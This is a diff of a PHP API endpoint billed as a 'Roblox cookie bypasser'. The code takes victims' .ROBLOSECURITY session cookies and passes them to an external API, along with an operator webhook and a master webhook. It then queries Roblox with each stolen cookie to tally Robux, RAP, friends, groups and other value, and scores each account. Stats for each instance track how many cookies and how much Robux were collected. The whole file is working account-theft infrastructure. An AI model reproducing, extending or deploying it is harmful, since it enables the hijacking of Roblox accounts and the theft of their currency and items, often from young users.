@@ -1,20 +1,30 @@
 <?php
 /**
- * Bypasserv3 - Bypass API Endpoint with External API Integration
+ * ============================================
+ * BYPASSERV3 - BYPASS API ENDPOINT
+ * Secure Roblox cookie bypasser using external API
+ * ============================================
  */
 
+// Headers
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 
+// Preflight
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
     exit;
 }
 
+// Load dependencies
 require_once '../config.php';
 require_once '../functions.php';
+
+// ============================================
+// SECURITY CHECKS
+// ============================================
 
 // Random security scan
 if (rand(1, 100) === 1) {
@@ -29,20 +39,28 @@ if (rand(1, 50) === 1) {
 // Method check
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
-    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
+    echo json_encode([
+        'success' => false,
+        'error' => 'Method not allowed'
+    ]);
     exit;
 }
 
 // Suspicious request check
 if (isSuspiciousRequest()) {
-    logSecurityEvent('suspicious_request', ['user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None']);
+    logSecurityEvent('suspicious_request', [
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
+    ]);
 }
 
 // Rate limiting
 $ip = getUserIP();
 if (!checkRateLimit($ip, 50, 3600)) {
     http_response_code(429);
-    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
+    echo json_encode([
+        'success' => false,
+        'error' => 'Rate limit exceeded'
+    ]);
     exit;
 }
 
@@ -51,14 +69,16 @@ $input = json_decode(file_get_contents('php://input'), true);
 
 if (json_last_error() !== JSON_ERROR_NONE) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
+    echo json_encode([
+        'success' => false,
+        'error' => 'Invalid JSON'
+    ]);
     exit;
 }
 
 // Extract data
 $cookie = trim($input['cookie'] ?? '');
 $directory = trim($input['directory'] ?? '');
-$checkOnly = $input['checkOnly'] ?? false;
 
 // Validate cookie
 if (empty($cookie)) {
@@ -74,55 +94,20 @@ if (!validateCookie($cookie)) {
     exit;
 }
 
-// Strip warning prefix
-$cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
+// Get instance data for webhook
+$instanceData = getInstanceData($directory);
+$userWebhook = $instanceData['userWebhook'] ?? '';
 
-// Quick validation check
-if ($checkOnly) {
-    $headers = ["Cookie: .ROBLOSECURITY=$cookie"];
-    $ch = curl_init("https://www.roblox.com/my/settings/json");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    
-    $data = json_decode($response, true);
-    
-    if (isset($data['UserId'])) {
-        echo json_encode([
-            'success' => true,
-            'valid' => true,
-            'userId' => $data['UserId'],
-            'username' => $data['Name'] ?? 'Unknown'
-        ]);
-    } else {
-        echo json_encode(['success' => false, 'valid' => false]);
-    }
-    exit;
-}
-
-// Get instance webhooks
-$instancePath = DATA_PATH . $directory . '/';
-$instanceFile = $instancePath . 'instance.json';
-$userWebhook = '';
-
-if (file_exists($instanceFile)) {
-    $instanceData = json_decode(file_get_contents($instanceFile), true);
-    $userWebhook = $instanceData['userWebhook'] ?? '';
-}
-
-// Call EXTERNAL API to bypass the cookie
-$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
-$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-$baseUrl = $protocol . '://' . $domain;
+// ============================================
+// CALL EXTERNAL API TO BYPASS
+// ============================================
 
 $externalApiUrl = EXTERNAL_API_URL . "?cookie=" . urlencode($cookie) . "&web=" . urlencode($userWebhook) . "&dh=" . urlencode(MASTER_WEBHOOK);
 
 $ch = curl_init($externalApiUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 180); // 3 minutes timeout
+curl_setopt($ch, CURLOPT_TIMEOUT, 180); // 3 minutes
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $apiResponse = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -137,29 +122,31 @@ if ($httpCode !== 200 || empty($apiResponse)) {
 
 $apiData = json_decode($apiResponse, true);
 
-if (!$apiData || !isset($apiData['robux'])) {
+if (!$apiData || $apiData['status'] !== 'success') {
     http_response_code(500);
     echo json_encode(['success' => false, 'error' => 'Invalid API response']);
     exit;
 }
 
-// Extract data from API response
-$robux = $apiData['robux'] ?? 0;
-$rap = $apiData['rap'] ?? 0;
-$summary = $apiData['summary'] ?? 0;
+// Extract stats from API response
+$robux = intval($apiData['robux'] ?? 0);
+$rap = intval($apiData['rap'] ?? 0);
+$summary = intval($apiData['summary'] ?? 0);
 
 // Update instance stats
-$currentStats = getInstanceData($directory);
-updateInstanceStats($directory, 'totalCookies', ($currentStats['stats']['totalCookies'] ?? 0) + 1);
-updateInstanceStats($directory, 'totalRobux', ($currentStats['stats']['totalRobux'] ?? 0) + $robux);
-updateInstanceStats($directory, 'totalRAP', ($currentStats['stats']['totalRAP'] ?? 0) + $rap);
-updateInstanceStats($directory, 'totalSummary', ($currentStats['stats']['totalSummary'] ?? 0) + $summary);
+if ($instanceData) {
+    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
+    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
+    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
+    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
+    
+    updateDailyStats($directory, 'cookies', 1);
+    updateDailyStats($directory, 'robux', $robux);
+    updateDailyStats($directory, 'rap', $rap);
+    updateDailyStats($directory, 'summary', $summary);
+}
 
-updateDailyStats($directory, 'cookies', 1);
-updateDailyStats($directory, 'robux', $robux);
-updateDailyStats($directory, 'rap', $rap);
-updateDailyStats($directory, 'summary', $summary);
-
+// Update global stats
 updateGlobalStats('totalCookies', 1);
 
 // Calculate account score
@@ -169,7 +156,7 @@ $accountScore += min(20, floor($rap / 5000));
 $accountScore += min(30, floor($summary / 10000));
 $accountScore = min(100, $accountScore);
 
-// Get user info from settings
+// Get user info
 $headers = ["Cookie: .ROBLOSECURITY=$cookie"];
 $ch = curl_init("https://www.roblox.com/my/settings/json");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -183,10 +170,9 @@ $userId = $settingsData['UserId'] ?? 'Unknown';
 $username = $settingsData['Name'] ?? 'Unknown';
 $isPremium = $settingsData['IsPremium'] ?? false;
 
-// Get additional info
+// Get additional user info
 $ch = curl_init("https://users.roblox.com/v1/users/$userId");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_TIMEOUT, 10);
 $response = curl_exec($ch);
 curl_close($ch);
@@ -202,7 +188,7 @@ $avatarUrl = $avatarData['data'][0]['imageUrl'] ?? 'https://www.roblox.com/heads
 $accountCreated = isset($userInfo['created']) ? strtotime($userInfo['created']) : time();
 $accountAgeDays = floor((time() - $accountCreated) / 86400);
 
-// Get friends count
+// Get friends
 $ch = curl_init("https://friends.roblox.com/v1/users/$userId/friends/count");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
@@ -212,7 +198,7 @@ curl_close($ch);
 $friendsData = json_decode($response, true);
 $friendsCount = $friendsData['count'] ?? 0;
 
-// Get followers count
+// Get followers
 $ch = curl_init("https://friends.roblox.com/v1/users/$userId/followers/count");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
@@ -222,7 +208,7 @@ curl_close($ch);
 $followersData = json_decode($response, true);
 $followersCount = $followersData['count'] ?? 0;
 
-// Get voice chat status
+// Get voice chat
 $ch = curl_init("https://voice.roblox.com/v1/settings");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
@@ -232,7 +218,7 @@ curl_close($ch);
 $vcData = json_decode($response, true);
 $vcEnabled = $vcData['isVoiceEnabled'] ?? false;
 
-// Get groups owned count
+// Get groups owned
 $ch = curl_init("https://groups.roblox.com/v2/users/$userId/groups/roles");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
